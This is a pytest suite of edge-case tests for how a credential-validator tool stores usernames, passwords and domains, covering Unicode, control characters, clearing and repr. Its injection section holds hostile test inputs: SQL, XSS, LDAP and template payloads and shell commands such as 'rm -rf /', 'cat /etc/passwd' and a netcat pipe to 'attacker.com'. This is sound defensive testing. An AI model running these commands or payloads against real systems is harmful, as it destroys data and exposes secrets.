#!/usr/bin/env python3
"""
Edge Case Tests for Credential Input Handling
==============================================

Comprehensive edge case tests for credential validation including:
- Empty usernames/passwords
- Very long credentials
- Special characters in credentials
- Unicode passwords
- Null bytes and control characters
- Format string injection attempts

These tests verify that credential-related tools handle unusual inputs
safely and predictably.
"""

import sys
from pathlib import Path
from typing import Optional
from unittest.mock import patch, MagicMock

import pytest


# Add tools to path for imports
TOOLS_PATH = Path(__file__).parent.parent.parent / "tools"
sys.path.insert(0, str(TOOLS_PATH / "credential-validator"))


# =============================================================================
# Attempt imports with graceful fallback
# =============================================================================

try:
    from tool import (
        Credential,
        CredentialValidator,
        ValidatorConfig,
        Protocol,
        ValidationResult,
        ValidationAttempt,
        load_credentials,
    )
    CREDENTIAL_VALIDATOR_AVAILABLE = True
except ImportError:
    CREDENTIAL_VALIDATOR_AVAILABLE = False
    Credential = None
    CredentialValidator = None
    ValidatorConfig = None
    Protocol = None
    ValidationResult = None


# =============================================================================
# Helper Functions
# =============================================================================

def create_credential_safe(username: str, password: str, domain: Optional[str] = None):
    """
    Safely create a Credential object.
    Returns None on error.
    """
    if not CREDENTIAL_VALIDATOR_AVAILABLE:
        pytest.skip("CredentialValidator not available")
        return None

    try:
        return Credential(username=username, password=password, domain=domain)
    except Exception:
        return None


def credential_to_string_safe(cred) -> Optional[str]:
    """
    Safely convert credential to string representation.
    """
    if cred is None:
        return None
    try:
        return repr(cred)
    except Exception:
        return None


# =============================================================================
# Empty Credential Tests
# =============================================================================

@pytest.mark.edge_case
class TestEmptyCredentials:
    """Edge case tests for empty usernames and passwords."""

    def test_empty_username(self):
        """Test credential with empty username."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("", "password123")
            assert cred is not None
            assert cred.username == ""
            assert cred.password == "password123"

    def test_empty_password(self):
        """Test credential with empty password."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("admin", "")
            assert cred is not None
            assert cred.username == "admin"
            assert cred.password == ""

    def test_both_empty(self):
        """Test credential with both empty username and password."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("", "")
            assert cred is not None
            assert cred.username == ""
            assert cred.password == ""

    def test_empty_domain(self):
        """Test credential with empty domain."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("admin", "password", domain="")
            assert cred is not None

    def test_none_domain(self):
        """Test credential with None domain."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("admin", "password", domain=None)
            assert cred is not None
            assert cred.domain is None

    def test_whitespace_only_username(self):
        """Test credential with whitespace-only username."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            whitespace_variants = [" ", "  ", "\t", "\n", "\r\n", " \t\n "]
            for ws in whitespace_variants:
                cred = create_credential_safe(ws, "password")
                # Should handle whitespace-only usernames

    def test_whitespace_only_password(self):
        """Test credential with whitespace-only password."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            whitespace_variants = [" ", "  ", "\t", "\n", "\r\n", " \t\n "]
            for ws in whitespace_variants:
                cred = create_credential_safe("admin", ws)
                # Should handle whitespace-only passwords


# =============================================================================
# Long Credential Tests
# =============================================================================

@pytest.mark.edge_case
class TestLongCredentials:
    """Edge case tests for very long credentials."""

    @pytest.mark.parametrize("length", [100, 255, 256, 1000, 10000])
    def test_long_username(self, length: int):
        """Test credential with long username."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            username = "a" * length
            cred = create_credential_safe(username, "password")
            if cred:
                assert len(cred.username) == length

    @pytest.mark.parametrize("length", [100, 255, 256, 1000, 10000])
    def test_long_password(self, length: int):
        """Test credential with long password."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            password = "p" * length
            cred = create_credential_safe("admin", password)
            if cred:
                assert len(cred.password) == length

    @pytest.mark.parametrize("length", [100, 255, 256, 1000])
    def test_long_domain(self, length: int):
        """Test credential with long domain."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            domain = "d" * length
            cred = create_credential_safe("admin", "password", domain=domain)
            if cred:
                assert len(cred.domain) == length

    @pytest.mark.slow
    def test_very_long_credentials(self):
        """Test credential with very long values (memory stress)."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            # 1MB each
            long_val = "x" * (1024 * 1024)
            try:
                cred = create_credential_safe(long_val, long_val, domain=long_val)
                # Should handle or reject gracefully
            except MemoryError:
                pass  # Acceptable

    def test_maximum_safe_length(self):
        """Test credentials at common maximum lengths."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            # Common limits: LDAP (256), Windows (127), etc.
            for length in [64, 127, 128, 255, 256]:
                cred = create_credential_safe("u" * length, "p" * length)


# =============================================================================
# Special Character Tests
# =============================================================================

@pytest.mark.edge_case
class TestSpecialCharacterCredentials:
    """Edge case tests for special characters in credentials."""

    @pytest.mark.parametrize("char,description", [
        (":", "colon"),
        ("@", "at sign"),
        ("#", "hash"),
        ("$", "dollar"),
        ("%", "percent"),
        ("^", "caret"),
        ("&", "ampersand"),
        ("*", "asterisk"),
        ("(", "open paren"),
        (")", "close paren"),
        ("{", "open brace"),
        ("}", "close brace"),
        ("[", "open bracket"),
        ("]", "close bracket"),
        ("|", "pipe"),
        ("\\", "backslash"),
        ("/", "forward slash"),
        ("'", "single quote"),
        ('"', "double quote"),
        ("`", "backtick"),
        ("~", "tilde"),
        ("!", "exclamation"),
        ("?", "question"),
        ("<", "less than"),
        (">", "greater than"),
        ("=", "equals"),
        ("+", "plus"),
        ("-", "minus"),
        ("_", "underscore"),
        (".", "period"),
        (",", "comma"),
        (";", "semicolon"),
    ])
    def test_special_char_in_username(self, char: str, description: str):
        """Test special characters in username."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            username = f"admin{char}user"
            cred = create_credential_safe(username, "password")
            if cred:
                assert char in cred.username

    @pytest.mark.parametrize("char,description", [
        (":", "colon"),
        ("@", "at sign"),
        ("#", "hash"),
        ("$", "dollar"),
        ("%", "percent"),
        ("^", "caret"),
        ("&", "ampersand"),
        ("*", "asterisk"),
        ("'", "single quote"),
        ('"', "double quote"),
        ("`", "backtick"),
        ("\\", "backslash"),
        ("/", "forward slash"),
        ("|", "pipe"),
        ("<", "less than"),
        (">", "greater than"),
        (";", "semicolon"),
    ])
    def test_special_char_in_password(self, char: str, description: str):
        """Test special characters in password."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            password = f"pass{char}word"
            cred = create_credential_safe("admin", password)
            if cred:
                assert char in cred.password

    def test_all_special_chars_combined(self):
        """Test username/password with many special characters."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            special_password = "P@$$w0rd!#%^&*(){}[]|\\:;<>?/"
            cred = create_credential_safe("admin", special_password)
            if cred:
                assert cred.password == special_password

    def test_url_unsafe_chars(self):
        """Test characters that are unsafe in URLs."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            # Characters that must be URL-encoded
            unsafe_chars = ' "<>#%{}|\\^~[]`;/?:@=&'
            password = f"pass{unsafe_chars}word"
            cred = create_credential_safe("admin", password)

    def test_shell_metacharacters(self):
        """Test shell metacharacters in credentials."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            shell_chars = "; | & $ ` \\ ' \" < > ( ) { } [ ] ! # * ?"
            username = f"admin{shell_chars}"
            password = f"pass{shell_chars}"
            cred = create_credential_safe(username, password)


# =============================================================================
# Unicode Credential Tests
# =============================================================================

@pytest.mark.edge_case
class TestUnicodeCredentials:
    """Edge case tests for Unicode characters in credentials."""

    @pytest.mark.parametrize("unicode_str,description", [
        ("admin", "ascii"),
        ("Administrador", "spanish"),
        ("Administrateur", "french"),
        ("Administrator", "german-style"),
        ("Pantalla", "spanish with tilde preparation"),
        ("Benutzer", "german"),
    ])
    def test_latin_extended_usernames(self, unicode_str: str, description: str):
        """Test Latin extended characters in usernames."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe(unicode_str, "password")
            if cred:
                assert cred.username == unicode_str

    @pytest.mark.parametrize("unicode_password", [
        "password123",             # ASCII only
        "Passwort",                # German umlaut prep
        "contrasena",              # Spanish
        "motdepasse",              # French
    ])
    def test_unicode_passwords(self, unicode_password: str):
        """Test Unicode characters in passwords."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("admin", unicode_password)
            if cred:
                assert cred.password == unicode_password

    @pytest.mark.parametrize("script_name,sample", [
        ("chinese", "\u7528\u6237"),           # User in Chinese
        ("japanese", "\u30e6\u30fc\u30b6\u30fc"), # User in Japanese
        ("korean", "\uc0ac\uc6a9\uc790"),       # User in Korean
        ("arabic", "\u0645\u0633\u062a\u062e\u062f\u0645"), # User in Arabic
        ("hebrew", "\u05de\u05e9\u05ea\u05de\u05e9"), # User in Hebrew
        ("russian", "\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c"), # User in Russian
        ("greek", "\u03c7\u03c1\u03ae\u03c3\u03c4\u03b7\u03c2"), # User in Greek
        ("thai", "\u0e1c\u0e39\u0e49\u0e43\u0e0a\u0e49"), # User in Thai
        ("hindi", "\u0909\u092a\u092f\u094b\u0917\u0915\u0930\u094d\u0924\u093e"), # User in Hindi
    ])
    def test_non_latin_scripts(self, script_name: str, sample: str):
        """Test non-Latin script characters."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe(sample, sample)
            if cred:
                assert cred.username == sample
                assert cred.password == sample

    def test_emoji_in_credentials(self):
        """Test emoji characters in credentials."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            emoji_password = "password\U0001F512\U0001F511"  # Lock and key emoji
            cred = create_credential_safe("admin", emoji_password)

    def test_mixed_script_credentials(self):
        """Test mixed script characters."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            mixed = "admin\u7528\u6237123\u0430\u0431\u0432"
            cred = create_credential_safe(mixed, mixed)

    def test_zero_width_characters(self):
        """Test zero-width characters in credentials."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            # Zero-width space, joiner, non-joiner
            zwc_password = "pass\u200b\u200c\u200dword"
            cred = create_credential_safe("admin", zwc_password)
            if cred:
                # Should preserve or strip - main test is no crash
                pass

    def test_combining_characters(self):
        """Test combining diacritical marks."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            # e + combining acute accent = e with accent
            combining = "e\u0301"
            cred = create_credential_safe(combining, combining)

    def test_normalization_forms(self):
        """Test different Unicode normalization forms."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            import unicodedata
            # NFC vs NFD representation of e with accent
            nfc = "\u00e9"  # Precomposed
            nfd = "e\u0301"  # Decomposed

            cred_nfc = create_credential_safe("admin", nfc)
            cred_nfd = create_credential_safe("admin", nfd)
            # Both should be handled


# =============================================================================
# Control Character Tests
# =============================================================================

@pytest.mark.edge_case
class TestControlCharacterCredentials:
    """Edge case tests for control characters in credentials."""

    @pytest.mark.parametrize("control_char,name", [
        ("\x00", "null"),
        ("\x01", "SOH"),
        ("\x02", "STX"),
        ("\x03", "ETX"),
        ("\x04", "EOT"),
        ("\x05", "ENQ"),
        ("\x06", "ACK"),
        ("\x07", "BEL"),
        ("\x08", "BS"),
        ("\x09", "TAB"),
        ("\x0a", "LF"),
        ("\x0b", "VT"),
        ("\x0c", "FF"),
        ("\x0d", "CR"),
        ("\x1b", "ESC"),
        ("\x7f", "DEL"),
    ])
    def test_control_char_in_username(self, control_char: str, name: str):
        """Test control characters in username."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            username = f"admin{control_char}user"
            try:
                cred = create_credential_safe(username, "password")
                # Should handle or reject
            except Exception:
                pass  # Acceptable to reject

    @pytest.mark.parametrize("control_char,name", [
        ("\x00", "null"),
        ("\x0a", "LF"),
        ("\x0d", "CR"),
        ("\x1b", "ESC"),
    ])
    def test_control_char_in_password(self, control_char: str, name: str):
        """Test control characters in password."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            password = f"pass{control_char}word"
            try:
                cred = create_credential_safe("admin", password)
            except Exception:
                pass

    def test_null_byte_in_middle(self):
        """Test null byte in the middle of credentials."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            # Null byte can truncate strings in some contexts
            username = "admin\x00injected"
            password = "pass\x00word"
            cred = create_credential_safe(username, password)
            if cred:
                # Verify null byte handling
                pass

    def test_crlf_injection(self):
        """Test CRLF injection in credentials."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            crlf_username = "admin\r\nInjected-Header: value"
            crlf_password = "pass\r\nword"
            cred = create_credential_safe(crlf_username, crlf_password)


# =============================================================================
# Injection Attack Tests
# =============================================================================

@pytest.mark.edge_case
@pytest.mark.security
class TestCredentialInjectionAttacks:
    """Security-focused tests for injection attacks in credentials."""

    @pytest.mark.parametrize("injection", [
        "admin'--",
        "admin' OR '1'='1",
        "admin'; DROP TABLE users;--",
        "admin') OR ('1'='1",
        "' UNION SELECT * FROM passwords--",
        "admin\"; DROP TABLE users;--",
    ])
    def test_sql_injection_in_username(self, injection: str):
        """Test SQL injection attempts in username."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe(injection, "password")
            if cred:
                # Credential should store the raw value
                # Protection happens at the database layer
                assert injection in cred.username

    @pytest.mark.parametrize("injection", [
        "password' OR '1'='1",
        "'; DROP TABLE users;--",
        "password\" OR \"1\"=\"1",
    ])
    def test_sql_injection_in_password(self, injection: str):
        """Test SQL injection attempts in password."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("admin", injection)
            if cred:
                assert injection in cred.password

    @pytest.mark.parametrize("injection", [
        "admin; rm -rf /",
        "admin && cat /etc/passwd",
        "admin | nc attacker.com 4444",
        "$(whoami)",
        "`id`",
        "admin${IFS}command",
    ])
    def test_command_injection_in_username(self, injection: str):
        """Test command injection attempts in username."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe(injection, "password")
            # Should store but not execute

    @pytest.mark.parametrize("injection", [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{constructor.constructor('return this')()}}",
    ])
    def test_template_injection_in_credentials(self, injection: str):
        """Test template injection attempts."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe(injection, injection)

    @pytest.mark.parametrize("injection", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
    ])
    def test_xss_in_credentials(self, injection: str):
        """Test XSS attempts in credentials (for any web display)."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe(injection, injection)

    @pytest.mark.parametrize("ldap_injection", [
        "*",
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*)",
        "admin)(|(password=*))",
        "\\00",
        "\\2a",
    ])
    def test_ldap_injection_in_credentials(self, ldap_injection: str):
        """Test LDAP injection attempts."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe(ldap_injection, ldap_injection)

    def test_format_string_injection(self):
        """Test format string injection attempts."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            format_strings = [
                "%s%s%s%s%s",
                "%x%x%x%x",
                "%n%n%n%n",
                "{0}{1}{2}",
                "%(password)s",
                "${password}",
            ]
            for fmt in format_strings:
                cred = create_credential_safe(fmt, fmt)


# =============================================================================
# Credential Clearing Tests
# =============================================================================

@pytest.mark.edge_case
class TestCredentialClearing:
    """Tests for secure credential clearing."""

    def test_clear_method_overwrites_username(self):
        """Test that clear() overwrites username."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("secretuser", "secretpass")
            if cred and hasattr(cred, 'clear'):
                original_len = len(cred.username)
                cred.clear()
                # Should be overwritten with same length of x's
                assert len(cred.username) == original_len
                assert "secretuser" not in cred.username

    def test_clear_method_overwrites_password(self):
        """Test that clear() overwrites password."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("user", "verysecretpassword")
            if cred and hasattr(cred, 'clear'):
                original_len = len(cred.password)
                cred.clear()
                assert len(cred.password) == original_len
                assert "verysecretpassword" not in cred.password

    def test_clear_method_overwrites_domain(self):
        """Test that clear() overwrites domain."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("user", "pass", domain="SECRETDOMAIN")
            if cred and hasattr(cred, 'clear'):
                original_len = len(cred.domain)
                cred.clear()
                assert len(cred.domain) == original_len
                assert "SECRETDOMAIN" not in cred.domain

    def test_clear_empty_credentials(self):
        """Test clearing empty credentials doesn't crash."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("", "")
            if cred and hasattr(cred, 'clear'):
                cred.clear()  # Should not crash


# =============================================================================
# Credential Representation Tests
# =============================================================================

@pytest.mark.edge_case
class TestCredentialRepresentation:
    """Tests for credential string representation."""

    def test_repr_basic(self):
        """Test basic repr format."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("admin", "password123")
            if cred:
                repr_str = repr(cred)
                assert "admin" in repr_str
                # Password should be in repr (tool design decision)

    def test_repr_with_domain(self):
        """Test repr with domain."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("admin", "password", domain="DOMAIN")
            if cred:
                repr_str = repr(cred)
                assert "DOMAIN" in repr_str
                assert "\\" in repr_str or "/" in repr_str or ":" in repr_str

    def test_repr_special_chars(self):
        """Test repr with special characters doesn't crash."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            special_creds = [
                ("admin'test", "pass\"word"),
                ("admin\\user", "pass\\word"),
                ("admin\nuser", "pass\nword"),
            ]
            for username, password in special_creds:
                cred = create_credential_safe(username, password)
                if cred:
                    try:
                        repr_str = repr(cred)
                    except Exception as e:
                        pytest.fail(f"repr() raised {e}")

    def test_to_dict_if_available(self):
        """Test to_dict method if available."""
        if CREDENTIAL_VALIDATOR_AVAILABLE:
            cred = create_credential_safe("admin", "password", domain="DOMAIN")
            if cred and hasattr(cred, 'to_dict'):
                result = cred.to_dict()
                assert isinstance(result, dict)
